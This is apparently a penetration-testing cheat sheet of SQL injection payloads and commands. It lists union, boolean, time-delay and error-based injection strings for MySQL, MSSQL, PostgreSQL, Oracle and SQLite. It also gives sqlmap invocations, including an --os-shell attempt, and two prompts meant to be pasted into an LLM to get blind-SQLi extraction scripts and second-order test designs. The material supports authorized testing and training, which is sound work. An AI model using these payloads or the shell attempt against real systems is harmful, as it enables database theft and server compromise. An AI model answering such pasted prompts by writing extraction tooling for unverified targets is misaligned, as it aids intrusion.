
---
Description :
     Manual SQLi checklist — union column count probe (MySQL style). Append to numeric or string parameter.

Parameters :

```cmd
' ORDER BY 1-- -
```

```example
http://10.10.10.10/item.php?id=1' ORDER BY 1-- -
```

Tags :  #linux #sqli #web #prompt #toolkit

---

Description :
     Union SELECT probe — find printable column

Parameters :

```cmd
' UNION SELECT NULL,NULL,NULL-- -
```

```example
' UNION SELECT NULL,@@version,NULL-- -
```

Tags :  #linux #sqli #mysql #toolkit

---

Description :
     SQL Server — stacked query time delay probe

Parameters :

```cmd
'; WAITFOR DELAY '0:0:5'--
```

```example
'; WAITFOR DELAY '0:0:5'--
```

Tags :  #linux #sqli #mssql #toolkit

---

Description :
     PostgreSQL — boolean time delay

Parameters :

```cmd
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

```example
' AND 1=(SELECT CASE WHEN (substring(user,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

Tags :  #linux #sqli #postgresql #toolkit

---

Description :
     Oracle — time delay

Parameters :

```cmd
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

```example
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

Tags :  #linux #sqli #oracle #toolkit

---

Description :
     SQLite — extract sqlite_version()

Parameters :

```cmd
' UNION SELECT sqlite_version(),NULL-- -
```

```example
' UNION SELECT sqlite_version(),NULL-- -
```

Tags :  #linux #sqli #sqlite #toolkit

---

Description :
     sqlmap — crawl and test GET parameters

Parameters : #url

```cmd
sqlmap -u "{{url}}" --batch --crawl=2 --risk=2 --level=2
```

```example
sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --risk=2 --level=2
```

Tags :  #linux #sqlmap #sqli #toolkit

---

Description :
     sqlmap — request file from Burp save (POST body)

Parameters : #file

```cmd
sqlmap -r {{file}} --batch --risk=2 --level=2
```

```example
sqlmap -r request.txt --batch --risk=2 --level=2
```

Tags :  #linux #sqlmap #sqli #toolkit

---

Description :
     sqlmap — OS shell attempt (requires stacked / file write)

Parameters : #url

```cmd
sqlmap -u "{{url}}" --os-shell --batch
```

```example
sqlmap -u "http://10.10.10.10/vuln.php?id=1" --os-shell --batch
```

Tags :  #linux #sqlmap #sqli #toolkit

---

Description :
     LLM prompt — blind boolean SQLi extraction strategy (paste into assistant)

Parameters :

```cmd
You are helping with AUTHORIZED penetration testing. Given a web parameter vulnerable to boolean-based blind SQLi, outline a binary search script to extract one character at a time from @@version. Include stopping conditions and URL encoding notes. Do not exploit systems without permission.
```

```example
(Paste prompt into your LLM with target context redacted appropriately.)
```

Tags :  #linux #sqli #prompt #llm #toolkit

---

Description :
     LLM prompt — second-order SQLi test design

Parameters :

```cmd
Draft test cases for second-order SQL injection: stored payload fields, delayed execution paths, and log-based sinks. Assume OWASP testing scope. Output as numbered checklist only.
```

```example
Use during secure code review or lab write-ups only.
```

Tags :  #linux #sqli #prompt #llm #toolkit

---

Description :
     Error-based — extract version (MySQL extractvalue)

Parameters :

```cmd
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- -
```

```example
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- -
```

Tags :  #linux #sqli #mysql #toolkit

---
